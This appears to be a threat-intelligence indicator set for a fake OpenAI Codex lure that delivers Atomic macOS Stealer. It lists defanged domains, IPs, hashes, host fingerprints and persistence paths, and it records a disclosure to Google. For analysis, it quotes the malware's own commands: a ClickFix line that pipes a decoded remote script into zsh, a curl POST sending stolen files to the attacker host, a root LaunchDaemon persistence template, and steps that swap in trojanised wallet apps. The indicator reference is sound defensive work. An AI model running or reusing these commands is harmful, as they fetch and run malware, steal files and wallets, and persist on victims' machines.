# Fake OpenAI Codex / Atomic Stealer — indicator set

Companion reference for the two-part series:

1. The page that showed me malware and showed the scanners a billing app  
2. The 43 characters the operator forgot to rotate

All indicators are defanged. Replace `[.]` with `.` and `hxxps` with `https` if you are loading these into tooling.

Indicators age quickly. `aspencore18[.]com` was already returning HTTP 520 at time of writing. Check status before acting.

---

## Confidence and pivot tiers

**Pivot distance**

| Tier | Meaning |
| :---- | :---- |
| T1 | Seed artefact, or bound to one by byte-level identity or a shared actor secret |
| T2 | Bound to a seed by one documented relationship (identical builder token, NS delegation of a seed domain, or A record of a seed domain) |
| T3 | Bound to a T2 indicator by one further documented relationship |

**Confidence**

| Level | Meaning |
| :---- | :---- |
| Confirmed | Relationship observed directly in DNS, RDAP, or a public sandbox/scan record |
| Assessed | Inferred from strong indirect evidence; basis stated inline |

---

## 1\. Actor-chosen secrets (highest specificity)

These are the operator's own strings. They do not rotate with the domains and are the most durable indicators here.

```
# 43-character base64url builder token
# Verified across 5 delivery domains and 6 path variants
2kqYRM0DCrnyJgoS4gVLL_FHJRRdTUhGCbjyuYwpZ6c

# Telemetry beacon: endpoint path + custom header pair
# Present in the seed dropper and all 5 variants, and again in the decrypted AMOS payload
POST /api/metrics/run?event=
Headers: user:  BuildID:      (values matching ^Ag[IL])

# Funnel stage values observed
pasted  boot  started  init_session  messengers  credentials
browsers  wallets  passmgr  pwd  resolve_auth  local_data

# Cloudflare Web Analytics token on the TALLY decoy page
6bc6f9e7508f478c9e91d32bcad95936

# Clipboard command shape (survives domain rotation)
curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
```

### Exfiltration command (full form)

The `cl:` and `cn:` header names are close to actor-chosen: they appear nowhere in ordinary tooling and travel alongside `user:` and `BuildID:`.

```
ditto -c -k --sequesterRsrc <staged FileGrabber tree> <archive>

curl --connect-timeout 30 --max-time 120 -X POST \
  -H "user: ... " -H "BuildID: ... " -H "cl: ... " -H "cn: ... " -H "X-Partial: 1" \
  -F "file=@..." hxxps://loombronze[.]com/contact
```

### macOS version fingerprint

Hand-rolled three-component comparison reducing the OS version to 1 or 0: "am I on macOS 26.4.1 or newer". Nothing branches on the result; it is reported alongside `uname -m` and `defaults read -g AppleLocale` in the beacon JSON, which already carries the raw version string separately.

```
sw_vers -productVersion | awk -F. '{if ($1+0>26 || ($1+0==26 && $2+0>4) || ($1+0==26 && $2+0==4 && $3+0>=1)) print 1; else print 0}'
```

---

## 2\. Core domains

| Domain | Role | Tier | Confidence |
| :---- | :---- | :---- | :---- |
| `sites[.]google[.]com/view/codexmac` | Lure page (Google Sites reputation shell) | T1 | Confirmed |
| `swiftsaverfin[.]com` | ClickFix host; Codex clone to macOS, TALLY decoy to all others | T1 | Confirmed |
| `aspencore18[.]com` | Stage-0 dropper and Mach-O payload | T1 | Confirmed |
| `atlas-compass[.]com` | Telemetry / funnel panel | T1 | Confirmed |
| `loombronze[.]com` | Primary exfiltration endpoint | T1 | Confirmed |
| `forgeoutline[.]com` | Secondary C2 (hard-coded in AMOS) | T1 | Confirmed |
| `ferncurrent14[.]com` | Delivery, same builder token | T2 | Confirmed |
| `quest-22[.]com` | Delivery, same builder token | T2 | Confirmed |
| `sheltercirrus[.]com` | Delivery, same builder token | T2 | Confirmed |
| `aspen-92[.]com` | Delivery, same builder token | T2 | Confirmed |
| `grove-satin[.]com` | Second telemetry panel instance | T2 | Confirmed |
| `spicas[.]top` | Actor-run authoritative DNS (coral, harbor) | T2 | Confirmed |
| `izaz[.]top` | Actor-run authoritative DNS (granite, breeze, frost, delta, violet) | T3 | Confirmed |
| `furud[.]top` | Actor-run authoritative DNS (velvet) | T3 | Confirmed |
| `amper[.]host` | Management domain (ns1, ns2, api) | T3 | Assessed (high) |

### Registration

Recorded so the relationships can be verified against public RDAP, not as any claim about these companies. Abuse passes through every large registrar, and a registration says nothing about the registrar's knowledge or intent.

| Registrar | Domains | Registered |
| :---- | :---- | :---- |
| Dominet (HK) Limited | `ferncurrent14[.]com`, `quest-22[.]com`, `sheltercirrus[.]com`, `aspen-92[.]com` | |
| Global Domain Group LLC | `spicas[.]top`, `izaz[.]top`, `furud[.]top` | 2026-08-03T12:54:57.0Z (all three, identical to the second) |
| Global Domain Group LLC | `amper[.]host` | 2026-03-21T19:33:52.781Z |

The identical second-level timestamp across the three nameserver domains indicates a scripted bulk purchase. Pull the RDAP records to confirm.

## 3\. IP addresses

| IP | Role | ASN | Tier |
| :---- | :---- | :---- | :---- |
| `158.94.211.29` | Backend; held A record of `forgeoutline[.]com` 15–17 Aug; hosts `coral.spicas[.]top` | AS202412 | T2 |
| `45.74.7.27` | Backend; current A record of `forgeoutline[.]com`; hosts `harbor.spicas[.]top` | AS202412 | T2 |
| `158.94.209.214` | Hosts `breeze.izaz[.]top`; links to older crypto-AML lure cluster | AS202412 | T3 |
| `45.74.7.178` | Hosts `api.amper[.]host` (Caddy management API) | AS202412 | T3 |
| `134.122.55.209` | Hard-coded IP fallback in payload | — | T1 |

Networks observed: `158.94.208.0/22`, `45.74.7.0/24`.

## 4\. Defanged URLs

| URL | Context |
| :---- | :---- |
| `hxxps://sites[.]google[.]com/view/codexmac` | Google Sites deployment shell |
| `hxxps://swiftsaverfin[.]com/codexx/` | ClickFix lure page |
| `hxxps://aspencore18[.]com/curl/0v95mzh95/y6jdnt8y1hu7bv33[.]dat` | Stage-0 zsh dropper |
| `hxxps://aspencore18[.]com/2kqYRM0.../google/update` | Mach-O payload |
| `hxxps://aspencore18[.]com/2kqYRM0.../DANTE/update` | Same token, urlscan artefact |
| `hxxps://ferncurrent14[.]com/2kqYRM0.../DANTE/update` | Same token, sibling domain |
| `hxxps://quest-22[.]com/2kqYRM0.../cc3/update` | Same token, sibling domain |
| `hxxps://quest-22[.]com/2kqYRM0.../oo4/update` | Same token, sibling domain |
| `hxxps://quest-22[.]com/2kqYRM0.../appnnu/update` | Same token, sibling domain |
| `hxxps://sheltercirrus[.]com/2kqYRM0.../cc3/update` | Same token, sibling domain |
| `hxxps://aspen-92[.]com/2kqYRM0.../oo2/update` | Same token, sibling domain |
| `hxxps://atlas-compass[.]com/api/metrics/run?event=pasted` | Conversion beacon |
| `hxxps://loombronze[.]com/contact` | Exfiltration, multipart POST |

Observed path variants for the builder token: `/google/`, `/DANTE/`, `/cc3/`, `/oo2/`, `/oo4/`, `/appnnu/`.

## 5\. File hashes

### Loader (seed sample)

| Item | Value |
| :---- | :---- |
| SHA-256 | `2598352b60f26532cc553c98828ed53c8c69644bb56526bfd63f0875cc525d38` |
| MD5 | `d3e8c18d5bceca09aa7b7541948d2782` |
| Code-sign identifier | `setup-231cb698c3cf14f825476dc66e2d58836258d9d9` (built as "setup") |
| Build ID / campaign | `user100` |
| Dropper AES-128-CTR key | `3850b1a23fec9e1b958601a27109d0d5` (IV \= 0\) |

### Dropper variants (all 0/75 on VirusTotal at time of collection)

| SHA-256 | Beacon host | Delivery URL |
| :---- | :---- | :---- |
| `14618f941479ea89e72ed8220ae4759d679486ae5696faf53baba68a9d3b25c8` | `atlas-compass[.]com` | `aspen-92[.]com/oo2/update` |
| `44cfad1ca9cadc518aac3346edd456271d88d14f49423a31edeaf2ff14483407` | `atlas-compass[.]com` | `quest-22[.]com/cc3/update` |
| `57238213b886f3cc6542ad62424f1fea58dc27a16e10d18310e168355d8a831f` | `atlas-compass[.]com` | `sheltercirrus[.]com/cc3/update` |
| `a8638d277c3b8d2f2a2fb464c17f514857b6fabba7cb18ebc963aa979c260365` | `atlas-compass[.]com` | `quest-22[.]com/oo4/update` |
| `8f210a32b10e65bf7984d6425888f7fb25f8a1ce998b809b561dbfe95b53382d` | `grove-satin[.]com` | `quest-22[.]com/appnnu/update` |

## 6\. Host artefacts (macOS)

| Path | Role |
| :---- | :---- |
| `/tmp/helper` | Dropped Mach-O loader |
| `~/Library/Caches/update_x3tqb3/` | Dropper fake "updater" state directory |
| `/Library/LaunchDaemons/com.apple.accountsd.helper.plist` | Root persistence |
| `/Library/LaunchDaemons/com.apple.metadata.mds.worker.plist` | Root persistence |
| `~/Library/Application Support/.com.apple.accountsd/` | Hidden payload directory |
| `~/Library/Application Support/.com.apple.metadata.mds/` | Hidden payload directory |
| `/Applications/Ledger Wallet.app` | Replaced with trojanised copy |
| `/Applications/Trezor Suite.app` | Replaced with trojanised copy |
| `/Applications/Exodus.app` | Replaced with trojanised copy |

Trojanised wallet staging, unpacked from `/zxc/` archives via dot-prefixed temp files:

```
pkill "Ledger Wallet" ; /Applications/Ledger Wallet.app  <- /zxc/app.zip     (via /tmp/.a_*)
pkill "Trezor Suite"  ; /Applications/Trezor Suite.app   <- /zxc/apptwo.zip  (via /tmp/.b_*)
pkill "Exodus"        ; /Applications/Exodus.app         <- /zxc/appex.zip   (via /tmp/.c_*)
```

### LaunchDaemon plist template

Stored in the AMOS string table in one piece, split only where the script interpolates a value. Both daemons use this template; `[com.apple.accountsd.helper]` is replaced with either fake label. Diff against anything you find on disk.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>[com.apple.accountsd.helper]</string>
    <key>ProgramArguments</key>
    <array>
      <string>/bin/bash</string>
      <string>[watchdog path]</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>ProcessType</key>
    <string>Background</string>
  </dict>
</plist>
```

Installation sequence, each line prefixed with the phished password piped into `sudo -S`:

```
sudo -S chown root:wheel ...
sudo -S mv -f ...
sudo -S launchctl enable system/...
sudo -S launchctl bootout system/...
sudo -S launchctl bootstrap system ...
xattr -dr com.apple.quarantine ...
```

## 7\. TLS / JARM fingerprints

| Host | TLS | Key | Issuer | JARM |
| :---- | :---- | :---- | :---- | :---- |
| `swiftsaverfin[.]com` | 1.3 | EC-P256 | Let's Encrypt E1 | `27d40d40d00040d1dc42d43d00041d6183ff1bfae51ebd88d70384363d525c` |
| `aspencore18[.]com` | 1.3 | EC-P256 | Google Trust WE1 | same as above |
| `atlas-compass[.]com` | 1.3 | EC-P256 | Google Trust WE1 | same as above |
| `loombronze[.]com` | 1.3 | EC-P256 | Google Trust WE1 | same as above |
| `forgeoutline[.]com` | 1.3 | RSA-2048 | Let's Encrypt R1 | `3fd3fd00000000000043d43d00043dc3b2afa8a5ec09b510a8559aff7899fb` |

## 7a. Host stack

| Property | `158.94.211.29` / `158.94.209.214` | `45.74.7.27` |
| :---- | :---- | :---- |
| SSH version | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 | OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 |
| SSH host key | `32:a9:08:65:10:bc:1e:be:9c:2d:9b:58:db:ac:0e:da` | `e0:66:35:71:87:c6:f5:13:f3:e5:3f:08:6e:44:80:84` |
| HASSH | `e42184b06d45385a906f0803d04c83da` | `41ff3ecd1458b0bf86e1b4891636213e` |
| Port 53 | Authoritative DNS | Authoritative DNS |
| Port 443 | Ncat HTTP proxy | Ncat HTTP proxy |

**Rejected pivot.** The host key above for `158.94.211.29` / `158.94.209.214` is shared, and also matches 14 other IPs across `158.94.208.0/22`. This is a hosting-provider VM-template artefact, not evidence of common ownership; several matching IPs host unrelated content. Do not pivot on it. The fingerprints are recorded here so the rejection can be checked rather than taken on trust.

## 8\. Shodan queries

```
product:"Ncat http proxy" port:443 net:158.94.208.0/22,45.74.0.0/16
net:158.94.208.0/22 port:53     -> 68 hosts
net:45.74.7.0/24 port:53        -> 6 hosts
```

## 9\. Delegated crypto-phishing domains (37)

All delegated to `coral.spicas[.]top` and `harbor.spicas[.]top`, the same authoritative pair controlling `forgeoutline[.]com`. T2, Confirmed for the NS delegation; brand attribution is by hostname inspection.

**Ledger (11)**

```
app-ledger[.]co[.]com          eng-ledgerlive[.]co[.]com      ledger-apps[.]org
ledger-live-en[.]org           ledger-live-eng[.]org          ledger-live-win[.]org
ledger-mod[.]org               ledger-soft[.]org              ledger-win[.]org
ledger-wnd[.]org               ledgerlive-v2[.]co[.]com
```

**Exodus (9)**

```
en-exodus[.]co[.]com           en-exodus-wallet[.]co[.]com    eng-exodus[.]co[.]com
exodus-app[.]club              exodus-app[.]nl                exodus-app[.]org
exodus-wallet-eng[.]co[.]com   v2-exodus[.]co[.]com           v2-exoduswallet[.]co[.]com
```

**Trezor (6)**

```
en-trezorsuile[.]net           eng-trezor[.]co[.]com          eng-trezor-suite[.]co[.]com
eng-trezorsuite[.]co[.]com     trezorsuite-v2[.]co[.]com      v2-trezorsuite[.]co[.]com
```

**Trust Wallet (2)**

```
trust-wallet-v2[.]net          v2-trust-wallet[.]io
```

**SafePal (2)**

```
safepal-en[.]co[.]com          v2-safepal[.]co[.]com
```

**TronLink (1)** — `tronlink-v[.]io` **Uniswap (1)** — `eng-uniswap[.]io`

**Non-brand (5)**

```
exportadoralangosmar[.]com     grupoconarpesa[.]com           pesquerasantapriscilasa[.]com
pwadex[.]com                   systellis[.]com
```

Ledger, Exodus and Trezor account for 26 of the 32 brand-impersonating domains. These are the same three applications the AMOS payload replaces on disk.

## 10\. Adjacent older cluster

Linked via `158.94.209.214` (`breeze.izaz[.]top`). Crypto-AML lure theme, activity from November 2025\.

```
trustchecks[.]info    biaudits[.]pro    trustaml[.]info
```

## 11\. Wallet browser extension IDs

Multiple IDs sit in the AMOS string table as an unbroken run of 32-character strings, each stored the same way: a `0x40` length prefix (64 bytes \= 32 UTF-16 characters), then the next entry starts immediately with no separator.

First entry, as a worked example:

```
0x40 = 64 bytes = 32 UTF-16 chars
-> nkbihfbeogaeaoehlefnkodbefgpgknn = MetaMask
```

---

## Disclosure

On 24 August 2026, the lure URL `sites[.]google[.]com/view/codexmac` was submitted to Google through the Safe Browsing phishing report form.

